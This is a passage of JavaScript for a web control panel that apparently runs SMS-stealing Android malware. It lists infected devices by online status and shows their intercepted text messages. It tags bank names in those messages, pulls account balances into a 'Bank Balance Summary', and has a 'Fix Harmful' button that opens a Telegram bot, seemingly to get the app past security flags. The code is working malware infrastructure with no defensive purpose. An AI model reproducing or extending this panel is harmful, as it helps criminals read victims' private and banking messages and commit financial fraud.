            const t = encryptToken(`https://${pid}-default-rtdb.firebaseio.com/`);
            document.getElementById('setting-token').value = t;
            document.getElementById('gen-box').classList.add('hidden');
        }
    };

    // Save
    document.getElementById('btn-save-token').onclick = () => {
        let t = document.getElementById('setting-token').value.trim();
        if(t.startsWith('https://')) t = encryptToken(t);
        const url = decryptToken(t);
        
        if(url) {
            const pid = url.match(/panel-wala-([^-]+)-default/)?.[1] || 'custom';
            const newEntry = { id: Date.now().toString(), label: `Project ${pid.toUpperCase()}`, token: t, realUrl: url };
            const saved = [...savedTokens.filter(x => x.realUrl !== url), newEntry];
            localStorage.setItem('panel_saved_tokens', JSON.stringify(saved));
            saveAccessToken(t);
            window.location.reload();
        } else {
            alert("Invalid Token");
        }
    };

    // Saved Tokens
    document.querySelectorAll('.btn-select-token').forEach(b => b.onclick = () => {
        const t = savedTokens.find(x => x.id === b.dataset.id);
        if(t) { saveAccessToken(t.token); window.location.reload(); }
    });
    document.querySelectorAll('.btn-del-token').forEach(b => b.onclick = () => {
        const newSaved = savedTokens.filter(x => x.id !== b.dataset.id);
        localStorage.setItem('panel_saved_tokens', JSON.stringify(newSaved));
        renderSettingsModal(); 
    });

    // Fix Harmful
    document.getElementById('btn-fix-harmful').onclick = () => {
        if(currentUrl) {
           const pid = currentUrl.match(/panel-wala-([^-]+)-default/)?.[1];
           if(pid) { copyToClipboard(pid); showToast("Project ID Copied"); }
        }
        window.open('https://t.me/android_protect_bot', '_blank');
    };

    // Reset Key
    document.getElementById('btn-reset-key').onclick = () => {
        const oldKey = prompt("Enter OLD Key to reset:");
        if(oldKey) {
            layer.innerHTML = `
               <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4 animate-fadeIn">
                 <div class="bg-white rounded-xl shadow-2xl p-6 w-full max-w-sm text-center">
                    <div class="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
                       <div class="animate-spin rounded-full h-6 w-6 border-b-2 border-orange-500"></div>
                    </div>
                    <h3 class="text-lg font-bold">Resetting Key...</h3>
                 </div>
               </div>
            `;
            resetUserKey(oldKey).then(res => {
                if(res.success) {
                    layer.innerHTML = `
                       <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4 animate-fadeIn">
                         <div class="bg-white rounded-xl shadow-2xl p-6 w-full max-w-sm text-center">
                            <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                               <svg class="w-6 h-6 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg>
                            </div>
                            <h3 class="text-lg font-bold text-gray-900 mb-2">Key Reset Successful</h3>
                            <div class="flex items-center gap-2 bg-green-50 p-4 rounded-lg border border-green-200 mb-6">
                                <code class="flex-1 text-xl font-mono text-green-700 font-bold tracking-wider">${res.newKey}</code>
                                <button id="btn-copy-new" class="text-green-500 hover:text-green-700 focus:outline-none"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg></button>
                            </div>
                            <button id="btn-use-new" class="w-full bg-app-green text-white font-bold py-3 rounded-xl shadow hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-app-green">Login with New Key</button>
                         </div>
                       </div>
                    `;
                    document.getElementById('btn-copy-new').onclick = () => copyToClipboard(res.newKey);
                    document.getElementById('btn-use-new').onclick = () => {
                        const input = document.getElementById('input-key');
                        if(input) { input.value = res.newKey; input.dispatchEvent(new Event('input')); }
                        layer.innerHTML = '';
                    };
                } else {
                    alert("Error: " + res.message);
                    renderSettingsModal();
                }
            });
        }
    };
};

// --- HOME SCREEN ---
const renderHome = () => {
    clearSubscriptions();
    const root = document.getElementById('root');
    const { homeFilter, homeSearch } = state;

    root.innerHTML = `
      <div class="h-full flex flex-col bg-gray-50 relative">
        <!-- Auto Refresh Indicator -->
        <div class="h-1 w-full bg-gray-200 fixed top-0 z-50"><div class="h-full bg-app-green animate-progress"></div></div>

        <div class="bg-white border-b px-4 py-3 sticky top-0 z-20 shadow-sm flex flex-col md:flex-row gap-3 justify-between items-center mt-1">
           <div class="flex items-center space-x-3 w-full md:w-auto">
              <div class="bg-app-green/10 p-2 rounded-lg text-app-green"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg></div>
              <div><h1 class="font-bold text-lg text-gray-900">Devices</h1><p id="home-stats" class="text-xs text-gray-500">Loading...</p></div>
           </div>
           
           <div class="flex items-center space-x-2 w-full md:w-auto overflow-x-auto no-scrollbar pb-1">
             <input id="search-input" value="${homeSearch}" class="border rounded-lg py-1.5 px-3 text-sm min-w-[140px] flex-1 focus:outline-none focus:border-app-green focus:ring-2 focus:ring-app-green/20" placeholder="Search..." aria-label="Search Devices">
             
             <!-- Filter Dropdown -->
             <div class="relative min-w-[100px]">
                <select id="status-filter" class="appearance-none w-full bg-white border border-gray-200 text-gray-700 py-1.5 pl-3 pr-8 rounded-lg text-sm font-medium focus:outline-none focus:border-app-green focus:ring-2 focus:ring-app-green/20" aria-label="Filter Status">
                  <option value="All" ${homeFilter==='All'?'selected':''}>All</option>
                  <option value="Online" ${homeFilter==='Online'?'selected':''}>Online</option>
                  <option value="Offline" ${homeFilter==='Offline'?'selected':''}>Offline</option>
                </select>
                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-500">
                  <svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
                </div>
             </div>

             <div class="w-px h-6 bg-gray-200 mx-1"></div>

             <button id="btn-bank-summary" class="p-2 text-gray-600 hover:text-green-700 bg-gray-100 hover:bg-green-50 rounded-lg flex-shrink-0 focus:outline-none focus:ring-2 focus:ring-green-500" title="Bank Balance Summary"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></button>
             <button id="btn-gsms" class="p-2 text-gray-600 hover:text-app-green bg-gray-100 hover:bg-green-50 rounded-lg flex-shrink-0 focus:outline-none focus:ring-2 focus:ring-app-green" title="Global SMS" aria-label="Global SMS"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg></button>
             <button id="btn-gdata" class="p-2 text-gray-600 hover:text-blue-600 bg-gray-100 hover:bg-blue-50 rounded-lg flex-shrink-0 focus:outline-none focus:ring-2 focus:ring-blue-500" title="Global Data" aria-label="Global Data"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg></button>
             <button id="btn-admin" class="p-2 text-gray-600 hover:text-purple-600 bg-gray-100 hover:bg-purple-50 rounded-lg flex-shrink-0 focus:outline-none focus:ring-2 focus:ring-purple-500" title="Admin Settings" aria-label="Admin Settings"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg></button>
             <button id="btn-del" class="p-2 text-red-400 hover:text-red-600 bg-gray-100 hover:bg-red-50 rounded-lg flex-shrink-0 focus:outline-none focus:ring-2 focus:ring-red-500" title="Delete Offline" aria-label="Delete All Offline"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>
           </div>
        </div>
        
        <div id="user-grid" class="flex-1 overflow-y-auto p-4 md:p-6 pb-20 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4 md:gap-6 auto-rows-min"></div>
      </div>
    `;

    const grid = document.getElementById('user-grid');
    const searchInput = document.getElementById('search-input');
    const statusFilter = document.getElementById('status-filter');
    let allUsers = [];

    const renderGrid = () => {
        const q = searchInput.value.toLowerCase();
        const f = statusFilter.value;
        const filtered = allUsers.filter(u => {
            const matchesS = (u.Brand && u.Brand.toLowerCase().includes(q)) || (u.DeviceId && u.DeviceId.toLowerCase().includes(q)) || (u.userId && u.userId.toLowerCase().includes(q));
            const matchesF = f === 'All' || u.Status === f;
            return matchesS && matchesF;
        }).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));

        const online = allUsers.filter(u=>u.Status==='Online').length;
        document.getElementById('home-stats').innerText = `${online} Online / ${allUsers.length} Total`;

        if(filtered.length === 0) {
            grid.innerHTML = `<div class="col-span-full flex flex-col items-center justify-center h-64 text-gray-400 border-2 border-dashed border-gray-200 rounded-xl bg-gray-50/50"><p>No devices found</p></div>`;
            return;
        }

        grid.innerHTML = filtered.map(u => `
          <div class="bg-white rounded-xl shadow-sm border border-gray-200 hover:shadow-lg hover:border-app-green/30 transition-all duration-300 flex flex-col justify-between overflow-hidden group min-h-[220px]">
             <div>
                 <div class="h-1.5 w-full ${u.Status==='Online'?'bg-green-500':'bg-gray-200'}"></div>
                 <div class="p-4 md:p-5">
                    <div class="flex justify-between items-start gap-3 mb-4">
                        <div class="flex-1 min-w-0">
                           <div class="flex items-start justify-between">
                              <h3 class="font-bold text-gray-900 text-lg leading-tight line-clamp-2" title="${u.Brand||''}">${u.Brand||'Unknown'}</h3>
                              ${u.Status==='Offline' ? `<button class="text-gray-300 hover:text-red-500 hover:bg-red-50 rounded-full p-1.5 -mt-1 -mr-1 btn-del-one focus:outline-none focus:ring-2 focus:ring-red-500" aria-label="Delete" data-uid="${u.userId}">✕</button>` : ''}
                           </div>
                           <div class="flex items-center space-x-1 mt-1 group/id cursor-pointer" onclick="navigator.clipboard.writeText('${u.DeviceId}'); alert('Copied')">
                              <p class="text-xs text-gray-500 font-mono truncate">${u.DeviceId}</p>
                              <svg class="w-3 h-3 text-gray-300 group-hover/id:text-app-green" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                           </div>
                           <div class="flex items-center space-x-2 mt-2">
                              <div class="flex items-center space-x-1.5 px-2.5 py-1 rounded-full shrink-0 ${u.Status==='Online'?'bg-green-50 text-green-700 ring-1 ring-green-500/20':'bg-gray-100 text-gray-500'}">
                                 ${u.Status==='Online'?'<span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span></span>':''}
                                 <span class="text-[10px] uppercase font-bold tracking-wider">${u.Status}</span>
                              </div>
                              ${u.checked ? '<div class="bg-blue-50 text-blue-500 p-1 rounded-full ring-1 ring-blue-500/20"><svg class="w-3 h-3 fill-current" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" /></svg></div>' : ''}
                           </div>
                        </div>
                    </div>
                 </div>
             </div>
             <div class="p-4 md:p-5 pt-0 mt-auto">
                 <div class="flex items-center text-xs text-gray-400 mb-3 pl-1">
                    <svg class="w-3.5 h-3.5 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                    <span class="truncate" id="time-${u.userId}">${timeAgo(u.timestamp)}</span>
                 </div>
                 <div class="grid grid-cols-2 gap-3">
                    <button class="btn-sms py-2.5 bg-gray-50 hover:bg-app-green hover:text-white text-gray-600 rounded-lg text-sm font-bold transition-all border border-gray-100 focus:outline-none focus:ring-2 focus:ring-app-green" data-uid="${u.userId}">SMS</button>
                    <button class="btn-data py-2.5 bg-gray-50 hover:bg-blue-600 hover:text-white text-gray-600 rounded-lg text-sm font-bold transition-all border border-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500" data-uid="${u.userId}">Data</button>
                 </div>
             </div>
          </div>
        `).join('');

        grid.querySelectorAll('.btn-sms').forEach(b => b.onclick = () => {
            state.selectedTargetUser = allUsers.find(u=>u.userId === b.dataset.uid);
            state.currentScreen = 'SMS_VIEW';
            state.smsBankFilter = null; // reset
            renderApp();
        });
        grid.querySelectorAll('.btn-data').forEach(b => b.onclick = () => {
            state.selectedTargetUser = allUsers.find(u=>u.userId === b.dataset.uid);
            state.currentScreen = 'DATA_VIEW';
            renderApp();
        });
        grid.querySelectorAll('.btn-del-one').forEach(b => b.onclick = (e) => {
            e.stopPropagation();
            if(confirm('Delete Device?')) deleteOfflineUsers([b.dataset.uid]);
        });
    };

    // Auto-Delete & Notifications Logic
    let hasChecked = false;
    state.subscriptions.push(subscribeToUsers((data) => {
        // --- NOTIFICATIONS: Check Status Transitions ---
        if (state.notificationsEnabled && state.prevUsersMap.size > 0) {
            data.forEach(user => {
                const prev = state.prevUsersMap.get(user.userId);
                if (prev && prev.Status === 'Online' && user.Status === 'Offline') {
                    sendNotification('Critical Alert', `${user.Brand || 'Device'} is now OFFLINE`);
                }
            });
        }
        // Update Previous State
        state.prevUsersMap = new Map(data.map(u => [u.userId, u]));
        // ----------------------------------------------

        allUsers = data;
        renderGrid();

        if(!hasChecked && data.length > 0) { 
            const now = Date.now();
            const oneDay = 24 * 60 * 60 * 1000;
            const candidates = data.filter(u => u.Status === 'Offline' && u.lastSeen && (now - u.lastSeen > oneDay));
            if (candidates.length > 0) {
                if(confirm(`Auto-Cleanup: Found ${candidates.length} users offline for more than 24h. Delete them?`)) {
                    deleteOfflineUsers(candidates.map(u => u.userId));
                    showToast(`Deleted ${candidates.length} old users`);
                }
                sendNotification('Maintenance Alert', `${candidates.length} stale offline devices detected.`);
            }
            hasChecked = true; 
        }
    }));

    // Auto Refresh Intervals
    startAutoRefresh(() => {
        allUsers.forEach(u => {
            const el = document.getElementById(`time-${u.userId}`);
            if(el) el.innerText = timeAgo(u.timestamp);
        });
    });

    searchInput.oninput = (e) => { state.homeSearch = e.target.value; renderGrid(); };
    statusFilter.onchange = (e) => { state.homeFilter = e.target.value; renderGrid(); };
    
    document.getElementById('btn-gsms').onclick = () => { state.currentScreen = 'GLOBAL_SMS'; state.smsBankFilter = null; renderApp(); };
    document.getElementById('btn-gdata').onclick = () => { state.currentScreen = 'GLOBAL_DATA'; renderApp(); };
    document.getElementById('btn-bank-summary').onclick = () => { state.currentScreen = 'BANK_SUMMARY'; renderApp(); };
    document.getElementById('btn-admin').onclick = async () => {
        const n = await getAdminNumber();
        const next = prompt("Update Admin Number:", n);
        if(next !== null) updateAdminNumber(next);
    };
    document.getElementById('btn-del').onclick = () => {
        const off = allUsers.filter(u=>u.Status==='Offline').map(u=>u.userId);
        if(off.length && confirm(`Delete ${off.length} offline users?`)) deleteOfflineUsers(off);
    };
};

// --- BANK BALANCE SUMMARY ---
const renderBankSummary = () => {
    clearSubscriptions();
    const root = document.getElementById('root');
    root.innerHTML = `
      <div class="h-full flex flex-col bg-gray-50">
        <header class="bg-white px-6 py-4 shadow-sm border-b sticky top-0 z-20 flex items-center flex-none">
          <button id="btn-back" class="mr-4 p-2 rounded-full hover:bg-gray-100 text-gray-600 transition-colors"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button>
          <div><h1 class="font-bold text-xl text-gray-900">Bank Balance Summary</h1><p class="text-xs text-gray-500">Latest detected balance per unique device</p></div>
        </header>
        <div id="summary-content" class="flex-1 overflow-auto p-4 md:p-6">
            <div class="flex justify-center mt-20"><div class="animate-spin rounded-full h-10 w-10 border-b-2 border-green-600"></div></div>
        </div>
      </div>
    `;
    
    document.getElementById('btn-back').onclick = () => { state.currentScreen = 'HOME'; renderApp(); };
    const content = document.getElementById('summary-content');

    fetchGlobalSMS().then(allSms => {
        const userMap = new Map();
        
        allSms.forEach(sms => {
            const banks = detectBanks(sms.sender + ' ' + sms.body);
            if(banks.length > 0) {
                const bal = extractBalance(sms.body);
                if(bal) {
                    const existing = userMap.get(sms.userId);
                    // Keep latest
                    if(!existing || sms.timestamp > existing.timestamp) {
                        userMap.set(sms.userId, {
                            userId: sms.userId,
                            deviceId: sms.androidId || sms.userId, // Fallback
                            bankName: banks[0],
                            amount: bal,
                            timestamp: sms.timestamp
                        });
                    }
                }
            }
        });

        const entries = Array.from(userMap.values()).sort((a,b) => b.timestamp - a.timestamp);

        if(entries.length === 0) {
            content.innerHTML = '<div class="flex flex-col items-center justify-center h-64 text-gray-400 border-2 border-dashed border-gray-200 rounded-xl bg-gray-50/50"><p class="font-medium">No balance data detected</p></div>';
            return;
        }

        content.innerHTML = `
          <div class="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
             <div class="overflow-x-auto">
               <table class="w-full text-left text-sm">
                 <thead class="bg-gray-50 border-b border-gray-200">
                   <tr>
                     <th class="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs">Device ID</th>
                     <th class="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs">Bank</th>
                     <th class="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs">Balance</th>
                     <th class="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs">Detected</th>
                   </tr>
                 </thead>
                 <tbody class="divide-y divide-gray-100">
                   ${entries.map(e => `
                     <tr class="hover:bg-gray-50 transition-colors">
                       <td class="px-6 py-4">
                         <div class="flex items-center space-x-2">
                           <span class="font-mono text-gray-600 truncate max-w-[150px]">${e.deviceId.substring(0,20)}${e.deviceId.length>20?'...':''}</span>
                           <button class="text-gray-400 hover:text-green-600 focus:outline-none btn-copy" data-txt="${e.deviceId}"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg></button>
                         </div>
                       </td>
                       <td class="px-6 py-4"><span class="px-2 py-1 bg-blue-50 text-blue-700 rounded-full text-xs font-bold border border-blue-100">${e.bankName}</span></td>
                       <td class="px-6 py-4 font-mono font-bold text-gray-900 text-base">${e.amount}</td>
                       <td class="px-6 py-4 text-gray-500 text-xs whitespace-nowrap">${new Date(e.timestamp).toLocaleString()}</td>
                     </tr>
                   `).join('')}
                 </tbody>
               </table>
             </div>
          </div>
        `;
        
        content.querySelectorAll('.btn-copy').forEach(b => {
            b.onclick = () => copyToClipboard(b.dataset.txt);
        });
    });
};

// --- SMS VIEWER ---
const renderSmsViewer = () => {
    clearSubscriptions();
    const isGlobal = !state.selectedTargetUser;
    const target = state.selectedTargetUser;
    const root = document.getElementById('root');
    let currentSmsList = [];
    let searchQ = '';
    
    root.innerHTML = `
      <div class="flex flex-col h-screen bg-app-bg relative">
        <div class="h-1 w-full bg-gray-200 fixed top-0 z-50"><div class="h-full bg-app-green animate-progress"></div></div>

        <header class="bg-white border-b px-4 py-3 flex items-center justify-between sticky top-0 z-30 shadow-sm mt-1">
            <div class="flex items-center space-x-3 overflow-hidden">
                <button id="btn-back" class="p-2 rounded-full hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-300" aria-label="Go Back"><svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button>
                <div class="overflow-hidden">
                    <h1 class="font-bold text-gray-900 truncate text-lg">${isGlobal ? "Global Messages" : target.Brand}</h1>
                    <div class="flex items-center space-x-1">
                        <p class="text-xs text-gray-500 truncate">${isGlobal ? "All Users" : target.userId}</p>
                        ${!isGlobal ? `<button onclick="navigator.clipboard.writeText('${target.userId}'); alert('Copied')" class="text-gray-400 hover:text-gray-600 focus:outline-none"><svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg></button>` : ''}
                    </div>
                </div>
            </div>
            <button id="btn-del-all" class="text-red-500 p-2 hover:bg-red-50 rounded focus:outline-none focus:ring-2 focus:ring-red-500" aria-label="Delete All"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>
        </header>
        
        <div class="bg-white px-4 py-2 border-b border-gray-100">
             <div class="relative">
               <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                 <svg class="h-4 w-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
               </div>
               <input id="sms-search" type="text" class="block w-full pl-10 pr-3 py-2 border border-gray-200 rounded-lg bg-gray-50 focus:outline-none focus:bg-white focus:border-app-green sm:text-sm transition-all focus:ring-2 focus:ring-app-green/20" placeholder="Search in conversation..." aria-label="Search Messages">
             </div>
        </div>

        <!-- BANK CHIPS CONTAINER (Horizontal Scroll) -->
        <div id="bank-chips-container" class="bg-white border-b border-gray-200 px-2 py-2 flex gap-2 overflow-x-auto no-scrollbar shadow-inner min-h-[50px] items-center whitespace-nowrap"></div>

        <div id="sms-list" class="flex-1 overflow-y-auto p-3 sm:p-4 space-y-3"></div>
      </div>
    `;

    document.getElementById('btn-back').onclick = () => { state.currentScreen = 'HOME'; renderApp(); };
    document.getElementById('btn-del-all').onclick = () => {
        if(confirm(`Delete ALL messages for ${isGlobal?'everyone':'this user'}?`)) {
            if(isGlobal) deleteAllGlobalSMS(); else deleteAllSMS(target.userId);
            document.getElementById('sms-list').innerHTML = '';
        }
    };

    const container = document.getElementById('sms-list');
    const chipContainer = document.getElementById('bank-chips-container');
    
    const renderList = () => {
        let filtered = currentSmsList.filter(m => 
            m.body.toLowerCase().includes(searchQ.toLowerCase()) || 
            m.sender.toLowerCase().includes(searchQ.toLowerCase())
        );

        if (state.smsBankFilter) {
            filtered = filtered.filter(m => {
                const banks = detectBanks(m.sender + ' ' + m.body);
                return banks.includes(state.smsBankFilter);
            });
        }

        if(!filtered.length) { container.innerHTML = '<p class="text-center text-gray-400 mt-10">No messages</p>'; return; }
        
        container.innerHTML = filtered.map(m => `
           <button class="w-full text-left bg-white rounded-lg shadow-sm p-3 sm:p-4 relative group border border-transparent hover:border-gray-200 transition-all cursor-pointer sms-item focus:outline-none focus:ring-2 focus:ring-app-green" data-idx="${m.key}">
              <div class="flex justify-between items-baseline mb-1 pr-8">
                 <span class="font-bold text-sm text-gray-800 truncate">${m.sender}</span>
                 <span class="text-[10px] text-gray-400 whitespace-nowrap">${new Date(m.timestamp).toLocaleDateString()} ${new Date(m.timestamp).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
              </div>
              ${isGlobal ? `<div class="mb-1"><span class="text-[10px] bg-gray-100 text-gray-500 px-1.5 py-0.5 rounded font-mono">User: ${m.userId.substring(0,6)}...</span></div>` : ''}
              <p class="text-sm text-gray-600 mb-2 whitespace-pre-wrap line-clamp-3">${m.body}</p>
              <div class="flex gap-1 flex-wrap mt-2">
                 ${detectBanks(m.sender+' '+m.body).map(b=>`<span class="text-[9px] bg-blue-50 text-blue-600 px-2 py-0.5 rounded border border-blue-100 font-bold">${b}</span>`).join('')}
              </div>
              <div class="btn-del-sms absolute top-2 right-2 p-1.5 text-gray-300 hover:text-red-500 hover:bg-red-50 rounded-full sm:opacity-0 group-hover:opacity-100 transition-opacity" data-uid="${m.userId}" data-key="${m.key}" role="button" aria-label="Delete Message">
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" /></svg>
              </div>
           </button>
        `).join('');

        container.querySelectorAll('.btn-del-sms').forEach(b => b.onclick = (e) => {
            e.stopPropagation();
            if(confirm('Delete message?')) deleteSMS(b.dataset.uid, b.dataset.key);
        });

        // Show Modal on click
        container.querySelectorAll('.sms-item').forEach((el, i) => {
             el.onclick = () => {
                 const m = filtered.find(x => x.key === el.dataset.idx); 
                 if(m) showSmsModal(m);
             };
        });
    };

    const renderChips = () => {
        const stats = {};
        currentSmsList.forEach(m => {
            detectBanks(m.sender + ' ' + m.body).forEach(b => {
                stats[b] = (stats[b] || 0) + 1;
            });
        });
        const banks = Object.keys(stats).sort((a,b) => stats[b] - stats[a]);
        
        if (banks.length === 0) {
            chipContainer.innerHTML = '<span class="text-xs text-gray-400 pl-2">No banks detected</span>';
            return;
        }

        let html = `<button class="chip px-3 py-1 text-xs rounded-full border transition-colors whitespace-nowrap font-bold ${!state.smsBankFilter ? 'bg-app-green text-white border-app-green' : 'bg-white text-gray-600 border-gray-300 hover:bg-gray-100'}" data-bank="ALL">All</button>`;
        
        banks.forEach(b => {
            const isActive = state.smsBankFilter === b;
            html += `<button class="chip px-3 py-1 text-xs rounded-full border transition-colors whitespace-nowrap flex items-center gap-1 ${isActive ? 'bg-app-green text-white border-app-green shadow' : 'bg-white text-gray-600 border-gray-300 hover:bg-gray-100'}" data-bank="${b}">
                ${b} <span class="${isActive ? 'bg-white/30' : 'bg-gray-200'} px-1.5 py-0.5 rounded-full text-[9px]">${stats[b]}</span>
            </button>`;
        });
        chipContainer.innerHTML = html;

        chipContainer.querySelectorAll('.chip').forEach(b => {
            b.onclick = () => {
                const val = b.dataset.bank;
                state.smsBankFilter = val === 'ALL' ? null : val;
                renderChips(); // re-render to update active state
                renderList();
            };
        });
    };
    
    const showSmsModal = (sms) => {
        const modal = document.createElement('div');
        modal.className = "fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn";
        modal.innerHTML = `
           <div class="bg-white rounded-lg shadow-xl w-full max-w-md overflow-hidden transform transition-all">
             <div class="bg-app-green px-4 py-3 flex justify-between items-center text-white">
               <h3 class="font-semibold text-lg truncate pr-2">${sms.sender}</h3>
               <button id="close-sms-modal" class="hover:bg-green-700 p-1 rounded focus:outline-none focus:ring-2 focus:ring-white">✕</button>
             </div>
             <div class="p-5 space-y-4 max-h-[70vh] overflow-y-auto">
               <div>
                  <label class="text-xs font-bold text-gray-500 uppercase">Message Body</label>
                  <p class="text-gray-800 text-sm whitespace-pre-wrap mt-1 bg-gray-50 p-3 rounded border border-gray-100">${sms.body}</p>
               </div>
